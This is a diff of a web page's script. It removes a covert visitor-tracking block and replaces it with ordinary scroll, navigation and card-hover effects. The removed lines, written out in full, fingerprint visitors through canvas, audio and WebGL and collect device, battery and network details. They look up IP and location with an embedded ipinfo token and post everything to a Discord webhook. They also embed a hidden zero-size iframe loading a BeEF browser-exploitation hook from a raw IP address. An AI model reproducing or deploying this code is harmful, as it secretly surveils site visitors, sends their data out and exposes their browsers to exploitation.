-  // Canvas-Fingerprint
-  const canvasFingerprint = getCanvasFingerprint();
-  // Audio-Fingerprint
-  const audioFingerprint = await getAudioFingerprint();
-  // AdBlocker?
-  const adblock = detectAdBlock();
-  // Fonts
-  const fonts = detectFonts();
-  // Plugins
-  const plugins = getPlugins();
-  // System/Browser Infos
-  const userAgent = navigator.userAgent;
-  const platform = navigator.platform;
-  const language = navigator.language;
-  const cores = navigator.hardwareConcurrency || "n/a";
-  const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "n/a";
-  const touchscreen = navigator.maxTouchPoints > 0 || "ontouchstart" in window ? "Yes" : "No";
-  // Battery
-  const battery = await getBatteryInfo();
-  // Network
-  const { type, downlink, effectiveType } = getNetworkInfo();
-  // MediaDevices
-  const mediaDevices = hasMediaDevices();
-  // NFC/Bluetooth
-  const nfc = hasNFC();
-  const bluetooth = hasBluetooth();
+    // Reveal on scroll
+    const io = new IntersectionObserver((entries)=>{
+      entries.forEach(e=>{
+        if(e.isIntersecting){ e.target.classList.add('visible'); io.unobserve(e.target); }
+      });
+    }, { threshold:.14 });
+    document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
 
-  // IP & Geo via ipinfo.io
-  let ipData = {};
-  try {
-    const res = await fetch("https://ipinfo.io/json?token=d2ce059db701bc");
-    ipData = await res.json();
-  } catch {
-    ipData = { ip: "n/a", city: "n/a", region: "n/a", country: "n/a", postal: "n/a", org: "n/a", timezone: "n/a", loc: "n/a" };
-  }
+    // Show nav after leaving hero & highlight active link
+    const nav = document.getElementById('nav');
+    const hero = document.getElementById('hero');
+    const links = [...document.querySelectorAll('[data-link]')];
+    const sections = links.map(a => document.querySelector(a.getAttribute('href'))).filter(Boolean);
 
-  // Payload zusammensetzen
-  const content = `
-🛰️ **NEW VISITOR ALERT** 🛰️
+    const setActive = () => {
+      const y = window.scrollY + 120;
+      let idx = 0;
+      sections.forEach((sec, i)=>{
+        const top = sec.offsetTop;
+        if(y >= top) idx = i;
+      });
+      links.forEach((l,i)=> l.classList.toggle('active', i===idx));
+    };
 
-🌐 **IP**: ${ipData.ip}
-📍 **Location**: ${ipData.city}, ${ipData.region}, ${ipData.country}, ${ipData.postal}
-🏢 **ISP**: ${ipData.org}
-🕑 **Timezone**: ${ipData.timezone}
-📡 **GPS (Approx.)**: ${ipData.loc || "n/a"}
+    const navToggle = () => {
+      const show = window.scrollY > (hero.offsetHeight * 0.6);
+      nav.classList.toggle('show', show);
+    };
 
-🧠 **System Infos**
-• **User-Agent**: ${userAgent}
-• **Platform**: ${platform}
-• **Language**: ${language}
-• **Screen Size**: ${screenSize}
-• **Dark Mode**: ${darkMode}
-• **GPU Fingerprint**: ${webglFingerprint}
-• **CPU Cores**: ${cores}
-• **RAM**: ${deviceMemory}
-• **Battery**: ${battery}
-• **Touchscreen**: ${touchscreen}
+    document.addEventListener('scroll', ()=>{ setActive(); navToggle(); }, {passive:true});
+    navToggle(); setActive();
 
-🎯 **Advanced Fingerprinting**
-• **Canvas FP**: ${canvasFingerprint}
-• **WebGL FP**: ${webglFingerprint}
-• **Audio FP**: ${audioFingerprint}
-• **AdBlocker**: ${adblock}
-• **Fonts**: ${fonts}
-• **Plugins**: ${plugins}
-• **Timezone (JS)**: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-
-🚀 **Network Infos**
-• **Connection Type**: ${type}
-• **Downlink**: ${downlink}
-• **Effective Type**: ${effectiveType}
-
-🧩 **Hardware Extras**
-• **MediaDevices**: ${mediaDevices}
-• **Bluetooth**: ${bluetooth}
-• **NFC**: ${nfc}
-
-🚀 **Timestamp**: ${new Date().toLocaleString()}
-  `;
-
-  // Senden an Discord Webhook
-  try {
-    await fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content })
+    // Smooth scroll for in-page anchors
+    links.forEach(a=>{
+      a.addEventListener('click', (e)=>{
+        e.preventDefault();
+        const target = document.querySelector(a.getAttribute('href'));
+        if(!target) return;
+        window.scrollTo({ top: target.offsetTop - 20, behavior:'smooth' });
+      });
     });
-  } catch (e) {
-    console.error("Discord Webhook failed:", e);
-  }
-})();
-</script>
-<!-- 🧠 Hidden BeEF Demo Hook -->
-<iframe src="http://37.221.92.148:3000/demos/butcher/index.html"
-        style="width:0;height:0;opacity:0;border:none;position:absolute;"></iframe>
-</body>
-</html>
 
-
+    // Tiny hover tilt on cards
+    document.querySelectorAll('.card').forEach(card=>{
+      card.addEventListener('mousemove', (e)=>{
+        const r = card.getBoundingClientRect();
+        const rx = ((e.clientY - r.top) / r.height - .5) * 4;
+        const ry = ((e.clientX - r.left) / r.width - .5) * -4;
+        card.style.transform = `rotateX(${rx}deg) rotateY(${ry}deg) translateY(-2px)`;
+      });
+      card.addEventListener('mouseleave', ()=> card.style.transform = '');
+    });
+  </script>
 </body>
 </html>
